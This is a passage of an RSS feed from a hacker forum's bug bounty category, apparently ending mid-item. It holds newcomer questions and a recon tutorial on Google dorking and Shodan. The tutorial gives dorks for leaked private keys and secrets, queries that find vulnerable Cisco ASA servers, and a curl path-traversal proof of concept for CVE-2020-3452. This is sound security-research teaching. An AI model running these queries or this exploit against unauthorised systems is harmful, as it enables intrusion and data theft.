<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:discourse="http://www.discourse.org/" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>Bug Bounty - 0x00sec - The Home of the Hacker</title>
    <link>https://0x00sec.org/c/bug-bounty/108</link>
    <description>Topics in the &#39;Bug Bounty&#39; category </description>
    
      <lastBuildDate>Sat, 26 Aug 2023 20:41:03 +0000</lastBuildDate>
      <atom:link href="https://0x00sec.org/c/bug-bounty/108.rss" rel="self" type="application/rss+xml" />
        <item>
          <title>Searching for a BBP parther</title>
          <dc:creator><![CDATA[0xgreyhound]]></dc:creator>
          <category>Bug Bounty</category>
          <description><![CDATA[
            <p>Hey im a 24y/o dude with about 2-2 and half years of experience in cyber security, mainly websec. Hit me up on IG: 0xgreyhound (most actvie) or “X”/Twitter <span class="mention">@multisigman64</span> if in interested. If you’re new to the field i can help you out aswell to get started, maybe on some VDP programs or even BBP. But so you would have atleast some experience even if can mentor you some. I would like to hangout on ex Discord/TS talking while hunting, as i got my little “squad” already but most either want to hunt alone or dont want to talk on Discord or have their own studys or are in different topics like malware dev or reverse engineering etc etc. So im basically hunting alone atm and it gets abit boring.</p>
            <p><small>6 posts - 5 participants</small></p>
            <p><a href="https://0x00sec.org/t/searching-for-a-bbp-parther/36648">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/searching-for-a-bbp-parther/36648</link>
          <pubDate>Sat, 26 Aug 2023 20:41:03 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>No</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-36648</guid>
          <source url="https://0x00sec.org/t/searching-for-a-bbp-parther/36648.rss">Searching for a BBP parther</source>
        </item>
        <item>
          <title>Do duplicate bug bounty reports have any value?</title>
          <dc:creator><![CDATA[LambdaCalculus]]></dc:creator>
          <category>Bug Bounty</category>
          <description><![CDATA[
            <p>Hey I got a quick newbie question for y’alls: I’ve recently taken up bug bounties (even for programmes or assets that are not eligible for payment) and found vulnerabilities in assets that have been previously discovered by other security engineers. Like for example, I found a reflective XSS vulnerability on one organisation’s website, and another critical bug for another organisation. But another researcher beat me to it <img src="https://0x00sec.org/images/emoji/twitter/cry.png?v=12" title=":cry:" class="emoji" alt=":cry:" loading="lazy" width="20" height="20"></p>
<p>Like the title of this thread suggests, do duplicate reports where I have discovered vulnerabilities on assets that have been previously discovered by others? Could this be valuable for personal growth, or for contributing to the community in making life harder for malicious hackers?</p>
<p>Sorry if this is a silly question. I am a newbie and eager to hear your thoughts and opinions!</p>
            <p><small>4 posts - 3 participants</small></p>
            <p><a href="https://0x00sec.org/t/do-duplicate-bug-bounty-reports-have-any-value/36099">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/do-duplicate-bug-bounty-reports-have-any-value/36099</link>
          <pubDate>Mon, 24 Jul 2023 15:06:59 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>No</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-36099</guid>
          <source url="https://0x00sec.org/t/do-duplicate-bug-bounty-reports-have-any-value/36099.rss">Do duplicate bug bounty reports have any value?</source>
        </item>
        <item>
          <title>What could this hidden authorization token/cookie be?</title>
          <dc:creator><![CDATA[0xgreyhound]]></dc:creator>
          <category>Bug Bounty</category>
          <description><![CDATA[
            <p>Im not sure if this is a forum for only posting or also asking questions? Anyways there is this target in a BBP i was working on a while back, where there are one GET and one POST request if i remember correctly on this login form, where i found a authorization token/cookie that doesnt normally exist, i found it in another way. And if you write anything into the token + a domain it will parse only the domain and do a DNS lookup to it. At first i was letsgo blind command injection but after awhile i noticed you can enter anything and it will only parse the domain and do that DNS lookup. So my theory is it could have been a blind SSRF that got reported so they deleted the token and restricted their firewall to block the HTTP request or that it is/was used for tracking users? You can enter xxx!"??–xxx <a href="http://domain.com" rel="noopener nofollow ugc">domain.com</a> xxxx$!,;xxx and it only parses the domain. What you guys think about this hidden token? Maybe worth putting some time into again?</p>
            <p><small>1 post - 1 participant</small></p>
            <p><a href="https://0x00sec.org/t/what-could-this-hidden-authorization-token-cookie-be/34098">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/what-could-this-hidden-authorization-token-cookie-be/34098</link>
          <pubDate>Thu, 23 Mar 2023 08:18:00 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>No</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-34098</guid>
          <source url="https://0x00sec.org/t/what-could-this-hidden-authorization-token-cookie-be/34098.rss">What could this hidden authorization token/cookie be?</source>
        </item>
        <item>
          <title>I&#39;m trying to figure out if this could somehow be overflowed</title>
          <dc:creator><![CDATA[alexa]]></dc:creator>
          <category>Bug Bounty</category>
          <description><![CDATA[
            <p>hope your having a nice day; so i have the following code that i want to know if it would somehow overflow at some point ::</p>
<pre><code class="lang-auto">static void * myalloc(size_t len) {
    void * p = malloc(len);
    if (p == NULL) {
        fprintf(stderr, "end of memory\n");
        exit(1);
    }
    return p;
}

static void * copy_buf(void * buf, uint32_t count, uint32_t be) {
    uint32_t * p = NULL;
    if (buf != NULL) {
        p = myalloc(count * 4);
        memcpy(p, buf, count * 4);
     }  
// more code
  return p;
}
</code></pre>
<p>if it did not overflow, would something else cause it to do so, i mean if the variables changed. or the parameters changed (not the data type of course, but the value of them).</p>
<p>thank you for your help, the full source code is much bigger (more than a one file and more that 2000 lines of code for each one), but this is one of the parts that i am concerned about…</p>
<p>have a nice day.</p>
            <p><small>8 posts - 8 participants</small></p>
            <p><a href="https://0x00sec.org/t/im-trying-to-figure-out-if-this-could-somehow-be-overflowed/25174">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/im-trying-to-figure-out-if-this-could-somehow-be-overflowed/25174</link>
          <pubDate>Mon, 08 Mar 2021 13:45:54 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>No</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-25174</guid>
          <source url="https://0x00sec.org/t/im-trying-to-figure-out-if-this-could-somehow-be-overflowed/25174.rss">I&#39;m trying to figure out if this could somehow be overflowed</source>
        </item>
        <item>
          <title>Using search engines for fun and bounties</title>
          <dc:creator><![CDATA[vict0ni]]></dc:creator>
          <category>Bug Bounty</category>
          <description><![CDATA[
            <p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/c/6/c6d3d695c5f6771913f814921e15508b54e94ef3.jpeg" data-download-href="/uploads/short-url/smUoPk1bwJiubYirr1uWxxXvNOX.jpeg?dl=1" title="2021-11-26_11-17"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/c/6/c6d3d695c5f6771913f814921e15508b54e94ef3_2_690x243.jpeg" alt="2021-11-26_11-17" data-base62-sha1="smUoPk1bwJiubYirr1uWxxXvNOX" width="690" height="243" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/c/6/c6d3d695c5f6771913f814921e15508b54e94ef3_2_690x243.jpeg, https://0x00sec.s3.amazonaws.com/optimized/3X/c/6/c6d3d695c5f6771913f814921e15508b54e94ef3_2_1035x364.jpeg 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/c/6/c6d3d695c5f6771913f814921e15508b54e94ef3.jpeg 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/c/6/c6d3d695c5f6771913f814921e15508b54e94ef3_2_10x10.png"></a></div><p></p>
<h2>
<a name="passive-vs-active-reconnaissance-1" class="anchor" href="https://0x00sec.org#passive-vs-active-reconnaissance-1"></a>Passive vs Active reconnaissance</h2>
<p>Passive reconnaissance plays an important role in the approach of a target. In comparison to active reconnaissance, passive reconnaissance is the silent, stealthy one, where the attacker doesn’t interact with the target. Instead, they obtain information about the target from other external, third-party sources. This information varies from open ports to discovering more assets and discovering sensitive information. Such a source for passive recon is search engines.</p>
<p>In the following article, I list two of the most popular ones, namely Google Search and Shodan, as well as some techniques I use to broaden my attack surface by finding more (potentially vulnerable) assets and uncovering secrets. I would love to also include Github Search but my limited experience with it doesn’t allow me that. Maybe in a future article? I hope.</p>
<h2>
<a name="google-search-2" class="anchor" href="https://0x00sec.org#google-search-2"></a>Google Search</h2>
<p>The use of Google Search has been increased with time, as it is a very easy way to discover not only hidden information lying around the web but also a quicker way to identify possible vulnerable domains and endpoints.</p>
<p>With using Google search as a passive recon tool comes also Google dorking. Google dorking is the technique of making more specific queries to Google Search based on filters and restrictions defined by the user so that the search engine returns more concrete results. It includes filters of the form</p>
<pre><code class="lang-auto">filter:value
</code></pre>
<p>and logical operators between the filters</p>
<pre><code class="lang-auto">filter:value [OPERATOR] filter:value
</code></pre>
<p>or</p>
<pre><code class="lang-auto">[OPERATOR]value
</code></pre>
<h3>
<a name="filters-and-operators-3" class="anchor" href="https://0x00sec.org#filters-and-operators-3"></a>Filters and Operators</h3>
<p>There are many filters that one can use with Google dorks. Some filters and operators that come handy when hunting for bugs:</p>
<ul>
<li>
<code>site</code><br>
Yields results from the specified site/domain, e.g. <code>site:example.com</code>
</li>
<li>
<code>inurl</code> and <code>allinurl</code><br>
Yields results that have the specified string in their URL, e.g. <code>inurl:cmd</code> and <code>allinurl:cmd execute</code>
</li>
<li>
<code>related</code><br>
Yields results related to the specified site/domain. It’s useful for finding an organization’s acquisitions. E.g. <code>related:randstad.com</code> returns results from companies’ domains, like <code>monster.com</code>, which belongs to Randstad.</li>
<li>
<code>filetype</code><br>
Yields results and endpoints from the specified filetype, e.g. <code>filetype:pdf</code>
</li>
<li>
<code>intitle</code> and <code>allintitle</code><br>
Yields results with the specified title, e.g. <code>intitle:Organisation intitle:Internal</code> or <code>allintitle:Organisation Internal</code>
</li>
<li>
<code>intext</code><br>
Yields results where the specified string was found within the text of a result, e.g. <code>intext:password</code>
</li>
<li>
<code>AND</code><br>
Logical AND operator to combine filters, e.g. <code>site:example.com AND filetype:pdf</code>
</li>
<li>
<code>OR</code>, <code>|</code><br>
Logical OR operator to combine filters, e.g. <code>site:example.com OR site:target.com</code> or <code>site:example.com | site:target.com</code>
</li>
<li>
<code>-</code><br>
Exception operator that is to be used before a filter, e.g. <code>site:example.com -site:www.example.com</code> will yield results from subdomains of <code>example.com</code> except for <code>www.example.com</code>. Also <code>-inurl:www</code> and <code>-www</code> can be used.</li>
<li>
<code>*</code><br>
Used as a wildcard, e.g. <code>site:www.example.*</code>
</li>
</ul>
<h4>
<a name="subdomain-discovery-4" class="anchor" href="https://0x00sec.org#subdomain-discovery-4"></a>Subdomain discovery</h4>
<p>The simple query</p>
<pre><code class="lang-auto">site:example.com -www
</code></pre>
<p>will ask Google to return results from every subdomain of <code>example.com</code> known to it, except for <code>www.example.com</code>. This is a good query to use for additional subdomain discovery, in case your automation missed any subdomains.</p>
<h4>
<a name="content-discovery-5" class="anchor" href="https://0x00sec.org#content-discovery-5"></a>Content discovery</h4>
<p>The query</p>
<pre><code class="lang-auto">site:example.com inurl:src
</code></pre>
<p>returns result with the parameter <code>src</code> in the url, like e.g. <code>https://example.com/css_src.php?src=</code>. Then later, the endpoint can be analyzed for possible vulnerabilities, especially if the parameter has a name that points to specific vulnerabilities like e.g. the parameter <code>return</code> points to Open Redirections.</p>
<h4>
<a name="discovering-technologies-open-to-the-public-6" class="anchor" href="https://0x00sec.org#discovering-technologies-open-to-the-public-6"></a>Discovering technologies open to the public</h4>
<p>Targeting specific technologies can be done through the <code>intitle</code> filter. The query</p>
<pre><code class="lang-auto">intitle:"Dashboard [Jenkins]" site:example.com
</code></pre>
<p>will return a public Jenkins instance belonging to <code>example.com</code>, if there is any.</p>
<h4>
<a name="secret-discovery-7" class="anchor" href="https://0x00sec.org#secret-discovery-7"></a>Secret discovery</h4>
<p>In the <a href="https://www.exploit-db.com/google-hacking-database">exploit-db.com collection</a> there is a large number of Google dorks queries for uncovering secrets and information on a target, like e.g. discovering private keys with the query</p>
<pre><code class="lang-nohighlight">"-----BEGIN RSA PRIVATE KEY-----" inurl:id_rsa
</code></pre>
<p>To be more creative, we can construct our own query for targeting files with sensitive information. Combining some of the above-mentioned filters, we can come up with</p>
<pre><code class="lang-nohighlight">site:*.target.com ( filetype:TYPE1 | filetype:TYPE2 ) intext:SECRET
</code></pre>
<p>where SECRET is the target secret we want to test/uncover, e.g. <code>password</code> and TYPE1/TYPE2 the filetype that is possible to contain such a secret, e.g. <code>pdf</code> or <code>txt</code> or <code>ppt</code>. Of course, both SECRET and TYPE1/TYPE2 may be depending on the target. For a company that has a billing process, SECRET may be <code>invoice</code> or <code>receipt</code> and for a, let’s say, contract reviewing company, the <code>pdf</code> and <code>docx</code> TYPE may be more possible to return any results.</p>
<p>Note that google dorking may return false negatives. That means that even if there is no result yielded from a query, that doesn’t mean that it doesn’t exist. Google’s search engine takes some time to update its search results if the website is new or developers prevent google from crawling their website by <a href="https://support.google.com/webmasters/answer/93710?hl=en">including a noindex meta tag in the page’s HTML code, or by returning a ‘noindex’ header in the HTTP request.</a></p>
<p>There are a lot of filters and operators to use for google dorks, so here is also some other lists with the available options:</p>
<div class="md-table">
<table>
<thead>
<tr>
<th style="text-align:left">Google dorks resources</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><a href="https://gist.github.com/sundowndev/283efaddbcf896ab405488330d1bbc06">Google dork cheatsheet</a></td>
</tr>
<tr>
<td style="text-align:left"><a href="https://ahrefs.com/blog/google-advanced-search-operators/">Google Search Operators: The Complete List (42 Advanced Operators)</a></td>
</tr>
<tr>
<td style="text-align:left"><a href="https://gist.github.com/stevenswafford/393c6ec7b5375d5e8cdc">google-dorks</a></td>
</tr>
<tr>
<td style="text-align:left"><a href="https://gist.github.com/stevenswafford/393c6ec7b5375d5e8cdc">Listing of a number of useful Google dorks.</a></td>
</tr>
</tbody>
</table>
</div><h3>
<a name="case-study-content-discovery-8" class="anchor" href="https://0x00sec.org#case-study-content-discovery-8"></a>Case study: Content discovery</h3>
<p>As mentioned before, you can use Google dorks to identify possible vulnerabilities. While I was hunting for bugs in a target, I came across a vanilla Apache server in <code>subdomain.target.com</code>, where I first thought that there was no content at all. By using the very simple query</p>
<pre><code class="lang-auto">site:subdomain.target.com
</code></pre>
<p>Google provided me links and relative paths of that subdomain that my wordlists missed. That led me to a web application deployed on that server, where I found an endpoint, which was vulnerable to XSS and another endpoint vulnerable to frame injection. Note that the endpoints that Google yielded weren’t included in the <code>gau</code> and <code>waybackurls</code> results.</p>
<h3>
<a name="case-study-vulnerable-parameter-9" class="anchor" href="https://0x00sec.org#case-study-vulnerable-parameter-9"></a>Case study: Vulnerable parameter</h3>
<p>While this requires a lot of time, one can search for possible vulnerable parameters in web applications with the <code>inrul</code> filter. With a list of parameters, one can test the existence of those parameters, which may be possible to be vulnerable to some kind of attack. In this case, using a <a href="https://github.com/victoni/Bug-Bounty-Scripts/blob/master/lists/open_redirection_parameters.txt">list of common open redirection parameters</a> and with the query</p>
<pre><code class="lang-auto">site:subdomain.target.com inurl:rt
</code></pre>
<p>I found an endpoint, vulnerable to open redirection, which I then escalated to XSS.</p>
<h3>
<a name="google-is-just-the-tool-10" class="anchor" href="https://0x00sec.org#google-is-just-the-tool-10"></a>Google is just the tool</h3>
<p>Google is probably the most powerful search engine there is. Learning to use it to our advantage can give us an edge. It can be a great starting point when starting doing recon or it can be used as a last resort when everything else has failed. It can even be used to <a href="https://github.com/sushiwushi/bug-bounty-dorks/blob/master/dorks.txt">find bug bounty programs</a> to start hacking.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/5/e/5ea51671b86579f532c9c21bb87f379a3a9efbcf.png" data-download-href="/uploads/short-url/dvgA15PXmIFU7jqWzxiHvPRa0ZF.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/5/e/5ea51671b86579f532c9c21bb87f379a3a9efbcf_2_554x500.png" alt="" data-base62-sha1="dvgA15PXmIFU7jqWzxiHvPRa0ZF" width="554" height="500" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/5/e/5ea51671b86579f532c9c21bb87f379a3a9efbcf_2_554x500.png, https://0x00sec.s3.amazonaws.com/original/3X/5/e/5ea51671b86579f532c9c21bb87f379a3a9efbcf.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/5/e/5ea51671b86579f532c9c21bb87f379a3a9efbcf.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/5/e/5ea51671b86579f532c9c21bb87f379a3a9efbcf_2_10x10.png"></a></div><p></p>
<h2>
<a name="shodan-11" class="anchor" href="https://0x00sec.org#shodan-11"></a>Shodan</h2>
<p>Although Shodan is pretty known and popular I think it’s not used that often for bug hunting as it should.</p>
<p>Shodan is a search engine for internet-connected devices. It is a specific purpose search engine, created first as a pet project. Now it is used to aid researchers on their work. It collects information about web servers such as open ports, services running on those ports and their banners. Making a query, let’s say “microsoft” will yield any device in shodan’s database that contains the word <code>microsoft</code> in its banners</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/3/3/332121aa8c391bc878e58eb9401a9c2b1017c8f1.png" data-download-href="/uploads/short-url/7ijkLrsskVeD7Jce4aDWXRRdt61.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/3/3/332121aa8c391bc878e58eb9401a9c2b1017c8f1_2_690x367.png" alt="" data-base62-sha1="7ijkLrsskVeD7Jce4aDWXRRdt61" width="690" height="367" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/3/3/332121aa8c391bc878e58eb9401a9c2b1017c8f1_2_690x367.png, https://0x00sec.s3.amazonaws.com/optimized/3X/3/3/332121aa8c391bc878e58eb9401a9c2b1017c8f1_2_1035x550.png 1.5x, https://0x00sec.s3.amazonaws.com/optimized/3X/3/3/332121aa8c391bc878e58eb9401a9c2b1017c8f1_2_1380x734.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/3/3/332121aa8c391bc878e58eb9401a9c2b1017c8f1_2_10x10.png"></a></div><p></p>
<p><br>
Shodan is best used with a one-time payment, where one gets access to most of its powers. But to use it’s specifiers (filters) you need to make a free account.</p>
<p>This search engine can play an important role in your bug hunting. When the scope is not strictly limited to specific subdomains and it is open enough to let you search for any server related to the organization, that’s where it shines the most.</p>
<h3>
<a name="filters-12" class="anchor" href="https://0x00sec.org#filters-12"></a>Filters</h3>
<p>Just like in Google, you can also make use of some filters the site provides in order to specify your query. Some of the most essentials are:</p>
<ul>
<li>
<code>http.status</code><br>
Returns the servers with the specified http status code, e.g. <code>http.status:200</code>.</li>
<li>
<code>http.title</code><br>
Queries for the specified http title that can be found in the banners. A distinctive example is the shodan dork used to find BIG IP vulnerable components: <code>http.title:"BIG-IP&amp;reg;- Redirect"</code>.</li>
<li>
<code>http.component</code><br>
Returns servers with the specified web technology that is used on the website, e.g. <code>http.component:"jenkins"</code>.</li>
<li>
<code>ssl</code><br>
Finds servers with the specified string included in the SSL certificate, e.g. <code>ssl:"Microsoft"</code>. This Filter can be further specified with <code>ssl.expired</code>, <code>ssl.version</code> (more on the resources).</li>
<li>
<code>org</code><br>
Finds servers with IP belonging to the specified organization’s netblock, e.g., <code>org:"Microsoft"</code>
</li>
<li>
<code>port</code><br>
The port filter returns components with the specified port open, e.g. <code>port:8080</code>.</li>
<li>
<code>os</code><br>
Using this filter shodan returns servers running the specified operating system, e.g. <code>os:Windows</code>.</li>
<li>
<code>product</code><br>
Using this filter shodan returns devices running this specific product, e.g. <code>product:"Apache Tomcat"</code> or <code>product:"IIS Windows Server"</code>
</li>
<li>
<code>version</code><br>
The <code>version</code> filter is to be combined with the <code>product</code> filter. It specifies the version of the specified product, e.g. <code>product:"Apache Tomcat" version:"7.0.82"</code>
</li>
<li>
<code>vuln</code><br>
This filter is only available to academic users or Small Business API subscriptions and higher. It’s used to to return components vulnerable to the specified CVE identifier, e.g. <code>vuln:cve-2010-2730</code>.</li>
</ul>
<p>Here are resources for shodan and its filters/use.</p>
<div class="md-table">
<table>
<thead>
<tr>
<th style="text-align:left">Shodan filters resources</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><a href="https://github.com/JavierOlmedo/shodan-filters">shodan-filters</a></td>
</tr>
<tr>
<td style="text-align:left"><a href="https://help.shodan.io/the-basics/search-query-fundamentals">Search Query Fundamentals</a></td>
</tr>
<tr>
<td style="text-align:left"><a href="https://github.com/jakejarvis/awesome-shodan-queries">awesome-shodan-queries</a></td>
</tr>
</tbody>
</table>
</div><p>Of course, the more filters you use in a query, the more specified the query is.</p>
<p>While all of the above-mentioned filters are the most important for bug hunting, my personal favorite filter is the <code>ssl</code>. Using the <code>ssl</code> filter you can search for certificates issued to the organization and lets you discover servers’ IPs that are either related to the organization (loose scope) or within the scope (strict scope) but were not picked up by your recon automation tools. You can check the latter with a reverse DNS lookup of the found IPs.</p>
<h3>
<a name="mixing-things-up-13" class="anchor" href="https://0x00sec.org#mixing-things-up-13"></a>Mixing things up</h3>
<p>Having all the above-mentioned filters in our arsenal, we can start narrowing down our results to our specific target.</p>
<h4>
<a name="case-study-sensitive-information-leak-14" class="anchor" href="https://0x00sec.org#case-study-sensitive-information-leak-14"></a>Case study: Sensitive information leak</h4>
<p>It is not necessary to combine a ton of filters to come to an end result. Using the simple filter</p>
<pre><code class="lang-auto">ssl:"Target"
</code></pre>
<p>where <code>Target</code> is the name of the organization, I found a number of servers whose certificates were issued to <code>Target</code>. Examining them one by one, while doing content discovery on one, I saw that the sensitive file <code>web.config.txt</code> was open in public, containing a number of SQLConnection strings, most of them related to <code>Target</code>. Even though there were no SQL ports open to the Internet for me to test them, I reported it and it got accepted.</p>
<h4>
<a name="case-study-ssl-certificate-and-cve-2020-3452-15" class="anchor" href="https://0x00sec.org#case-study-ssl-certificate-and-cve-2020-3452-15"></a>Case study: SSL certificate and CVE-2020-3452</h4>
<p>In July 2020 Cisco’s Adaptive Security Appliance (ASA) Software and Firepower Threat Defense (FTD) were found vulnerable to unauthenticated file read/path traversal. The affected systems were WebVPN servers, which carried the string <code>"Set-Cookie: webvpn;"</code> in their banners. Restricting the search to include only servers whose SSL certificates include the organization’s name, I was able to find several servers vulnerable to CVE-2020-3452.</p>
<p>Query:</p>
<pre><code class="lang-auto">ssl:"Target" "Set-Cookie: webvpn;"
</code></pre>
<p>Vulnerability checking/PoC for CVE-2020-3452:</p>
<pre><code class="lang-bash">curl -s -k "https://[IP or DOMAIN]/+CSCOT+/translation-table?type=mst&amp;textdomain=/%2bCSCOE%2b/portal_inc.lua&amp;default-language&amp;lang=../"
</code></pre>
<p>The <code>ssl</code> filter can be further used for more specific results. The SSL certificate is read by Shodan in a JSON format with this form (<a href="https://blog.shodan.io/ssl-update/">source</a>):</p>
<pre><code class="lang-auto">"ssl": {
    "cert": {
        "sig_alg": "sha1WithRSAEncryption",
        "issued": "20110325103212Z",
        "expires": "20120324103212Z",
        "expired": true,
        "version": 2,
        "extensions": [{
            "data": "\u0003\u0002\u0006@",
            "name": "nsCertType"
        }],
        "serial": 10104044343792293356,
        "issuer": {
            "C": "TW",
            "L": "TAIPEI",
            "O": "CAMEO",
            "ST": "TAIWAN"
        },
        "pubkey": {
            "bits": 1024,
            "type": "rsa"
        },
        "subject": {
            "C": "TW",
            "L": "TAIPEI",
            "O": "CAMEO",
            "ST": "TAIWAN"
			"CN":"name.tld"
        }
    },
    "cipher": {
        "version": "TLSv1/SSLv3",
        "bits": 256,
        "name": "AES256-SHA"
    },
    "chain": ["-----BEGIN CERTIFICATE----- 
	MIICETCCAXqgAwIBAgIJAIw4xswSiNXsMA0GCSqGSIb3DQEBBQUAMD8xCzAJBgNV
	BAYTAlRXMQ8wDQYDVQQIEwZUQUlXQU4xDzANBgNVBAcTBlRBSVBFSTEOMAwGA1UE
	ChMFQ0FNRU8wHhcNMTEwMzI1MTAzMjEyWhcNMTIwMzI0MTAzMjEyWjA/MQswCQYD
	VQQGEwJUVzEPMA0GA1UECBMGVEFJV0FOMQ8wDQYDVQQHEwZUQUlQRUkxDjAMBgNV
	BAoTBUNBTUVPMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCj8HWSuWUHYWLD
	ASV1KCWd9+9U19tINKgY8CTw/gKeVoF6bjgQ3tuXliScLAsU8nNGiZibaXq9KR67
	nLjjHzFiJDr6s8M3qimLdhcA7kf71v806Mls4KctdrMUiX3Bc7WvYtbClke0QDlC
	FGgK7HksEWpQ026E3pI0T/2mTvbeXQIDAQABoxUwEzARBglghkgBhvhCAQEEBAMC
	BkAwDQYJKoZIhvcNAQEFBQADgYEANbiCHCROX0X9ZbBaOsijkGh6+7WLaLUDEUpp
	rw+bHFKhOvtQgEyQ01U0V9ZYtdPyVLnNVmJu6Q8MPuqBCkpcv0/gH31YSSRyOhid
	vc+qCUCA7UBqt5f7QVOOYPqhzieoUO+pmQ3zidcwUGYh19gQv/fl7SnG00cDgxg3
	m89S7ao=
	-----END CERTIFICATE-----
	"],
    "versions": ["TLSv1", "SSLv3", "-SSLv2", "-TLSv1.1", "-TLSv1.2"]
}
</code></pre>
<p>We can parse the SSL certificate and search for a term in it. We can parse the JSON by separating the nested JSON keys with <code>.</code>. To search for Common Names with the term <code>target</code> in it, we can use the query <code>ssl.cert.subject.CN:target</code>.</p>
<h4>
<a name="case-study-netblocks-and-cve-2020-3452-16" class="anchor" href="https://0x00sec.org#case-study-netblocks-and-cve-2020-3452-16"></a>Case study: Netblocks and CVE-2020-3452</h4>
<p>A technique <a href="https://twitter.com/sneakerhax/">sneakerhax</a> showed me a while ago is looking if the target organization owns an ASN. This can not only be done in the cli but also in shodan. Like the previous case study, discovering a server vulnerable to CVE-2020-3452 within the target’s ASN can be done with the query</p>
<pre><code class="lang-auto">"Set-Cookie: webvpn;" org:"Target"
</code></pre>
<p>Important the thing here is to do an additional check on whether the server is actually owned by the target and not just hosted in their ASN. So, to do that, you can add the <code>ssl:"Target"</code> filter or perform a reverse DNS check on the IP and see if the domain name is within the scope.</p>
<h3>
<a name="shodan-cli-17" class="anchor" href="https://0x00sec.org#shodan-cli-17"></a>Shodan CLI</h3>
<p>Using the web app can be tiring and slow, so there is also the <a href="https://cli.shodan.io/">shodan cli</a> option to get your results straight into your command line and integrate it with your pipeline and other tools. You just need to initialize it with your API Key.</p>
<p>Shodan CLI can help you with your initial passive recon. After initializing the tool, you can use it for port scanning, banner grabbing, and probing for HTTP ports by using httpx/httprobe:</p>
<pre><code class="lang-auto">$ shodan host x.x.x.x # port scanning
$ shodan search ip:x.x.x.x # banner grabbing
$ shodan host --format tsv x.x.x.x | awk '{ print"x.x.x.x:"$1 }' | httpx -silent # probing for HTTP ports
</code></pre>
<h3>
<a name="google-search-for-servers-and-iot-devices-18" class="anchor" href="https://0x00sec.org#google-search-for-servers-and-iot-devices-18"></a>Google search for servers and IoT devices</h3>
<p>As previously mentioned, using Shodan for bug bounties shines the most, when it’s combined with an open scope, where systems related to the organization can also be reported. But, as with all tools and search engines, shodan doesn’t have every possible IP, so it might also lead to false negatives. But it’s definitely a valuable tool to use after doing your initial recon.</p>
<h2>
<a name="conclusion-19" class="anchor" href="https://0x00sec.org#conclusion-19"></a>Conclusion</h2>
<p>Using search engines for passive reconnaissance, either that is endpoint or secret or subdomain discovery, requires a lot of digging and can take some time. But when it comes to bug hunting, the more digging a bug requires the more probable it is to not be a dupe. Testing out the filters and creating unique and creative queries is the key.</p>
            <p><small>11 posts - 7 participants</small></p>
            <p><a href="https://0x00sec.org/t/using-search-engines-for-fun-and-bounties/23832">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/using-search-engines-for-fun-and-bounties/23832</link>
          <pubDate>Mon, 09 Nov 2020 13:04:55 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>No</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-23832</guid>
          <source url="https://0x00sec.org/t/using-search-engines-for-fun-and-bounties/23832.rss">Using search engines for fun and bounties</source>
        </item>
        <item>
          <title>Looking for Bug Bounty Tips/Advice</title>
          <dc:creator><![CDATA[atykin]]></dc:creator>
          <category>Bug Bounty</category>
          <description><![CDATA[
            <p>Hi! I’m new to the bug bounty scene. I was a junior software developer before I got fired when this pandemic started. Hence, I can pretty much read code and I also know how to deploy my own website on a server using IaaS platforms (I still don’t know how to use Docker though).</p>
<p>As for my bug hunting skills, all that I can do is some basic recon using sublist3r, amass, and tomnomnom’s assetfinder, as well as some basic SQLi and basic XSS (reflected and stored). I also know how to use some of BurpSuite’s functionalities like Intruder and Repeater for XSS and some other injection stuff. I’m always watching and studying videos made by Stök, Tomnomnom, NahamSec and TheCyberMentor (I learned all these basic hacking skills from him).</p>
<p>I’m looking for tips on how to approach a large scope, and what to look for (aside from data input parameters and file uploads). Any suggestions for other attacks that I could learn at my current skill level would also help. Thanks!</p>
            <p><small>7 posts - 6 participants</small></p>
            <p><a href="https://0x00sec.org/t/looking-for-bug-bounty-tips-advice/22355">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/looking-for-bug-bounty-tips-advice/22355</link>
          <pubDate>Thu, 23 Jul 2020 03:06:52 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>No</discourse:topicClosed>
